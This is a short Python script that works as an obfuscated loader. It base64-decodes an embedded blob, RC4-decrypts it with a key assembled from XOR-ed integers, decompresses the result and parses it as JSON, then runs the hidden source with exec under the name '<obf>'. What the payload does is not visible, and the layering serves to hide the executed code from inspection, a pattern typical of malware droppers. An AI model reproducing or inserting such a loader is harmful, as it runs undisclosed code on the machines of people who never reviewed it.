import base64,zlib,json,binascii
_B = 'ubjW/dq4y2l5TtJv6nF5xWYTHeBsNRWPuvIJICTWC15FnduGLWalelbRbaPNpQr3aZp5/5EdSGGzWqNhd9DIJX+dtH8a+YAGMOU+wV50MVb0iyyt32Xli4d/qdruk806fVNr3BHve7WvXQhZX2D6govB1X4sK5Z4/zqbvRn6U2XK9PcMpzyjrjQCeTaRdlxBLhcYc6iKpqGmRlHlpfXRW/t97nte7TnWxrZ6bpXl2CAUA8Kifu0SBVzdQwnQEp7p8+1QKcTyYd17iwWWP28RO6tZuH5dbF7pqZ64dIeEyjEyZaEXey4FLCg+D1kYTnxtkvm98J4D1WrL5soEcgUBTYicef6KkjZ/i4x8Q8pRoVE2DNF/1vRtO1CNSU9k5FrZyw7M1NHucfplC5ZxBqsVmZaxjvkuUUQbdzDPX7u1muK8pRcbL5JZT6t/7O2MMpnB5jQp7TC/zRtoEuozhHCrEIwAKRVGpN7MLDtFPX0RQEZwCeDNmfEpltRCqrtBvi/TfOLc3tRZ2aCHN6yoad1bj0uTT3gb7L4adlZ67RDry8jgUGmz3gdonhqRQ7b5k32SKYr47Tou7uRwOhQ1Yq/xGI1DuxtsEplD08KALcg1Kmor2a9u9aoOy1Wwo/t4KOaBSqheCZBLz68+QfWWLB2SmlkjQnRVMP9/p9RvpwSwxppPtwQ45wNc7co/JXTjDkR89IUr0hF0648xDN9n/81DkHg2WA7HQTt0gBFuv2RsOBbOLI9ulDhZZ1q0uoo2Uc5UciY51IgcU7puNvRujhJNEv0QaHJMP9XpdQ9chIayVHBXO/FvTs/onUy1f1zSK2kX4rdS5JNW14dlGQ4EIzSGUez5XSmMtiRz/VTkE+GKmjzeCbaRsTmU2Ir3sbUGGwpTaeoZ9iQWWcQRA3KCzKgtHvaM+0OjmU16FdsKFDhSXoCLi1tYktG2deUhlL1/CB6b5EHe0aH6EVtlUECQHpAhiNFggQ8UnAYYbczH12INA0oSeTb0frspzkYkcfT4GV/O/5//0VrMFUsPNwQBSYkiSLYPNpC7XCpplx0611Mjs69LynQi9PLNQI1JImzIwY0BkMqImuRElc0F1xd/MkEsdPvUlpkxRtM31W3ZV0Bi1jCssJHbB4Ioz3/MexBWsgsNoiGU7ISQ5SMbRdQC3W3M/Tm6SfjOTm3iHRIQCwBttABAPRi9QL2K160='
_P = [(2180033802,6882018,4),(2753938992,16418858,4),(1806735099,14062355,4),(922503433,3844220,4),(3491275961,14201087,4),(13907647,14199771,4),(1368958627,13030390,4),(1545256113,3009422,4)]
def _reconstruct(parts):
    out = []
    for v,p,l in parts:
        x = v ^ p
        out.append(x.to_bytes(l,'big'))
    return b''.join(out)
_k = _reconstruct(_P)
def _rc4(data, key):
    S = list(range(256))
    j = 0
    kl = len(key)
    for i in range(256):
        j = (j + S[i] + key[i % kl]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray(len(data))
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out[k] = data[k] ^ S[(S[i] + S[j]) % 256]
    return bytes(out)
_x = base64.b64decode(_B)
_r = _rc4(_x, _k)
_j = zlib.decompress(_r).decode('utf-8')
_payload = json.loads(_j)
mapping = {int(k):v for k,v in _payload['m'].items()}
def _S(i):
    return zlib.decompress(binascii.unhexlify(mapping[i])).decode('utf-8')
src = _payload['s']
exec(compile(src,'<obf>','exec'))
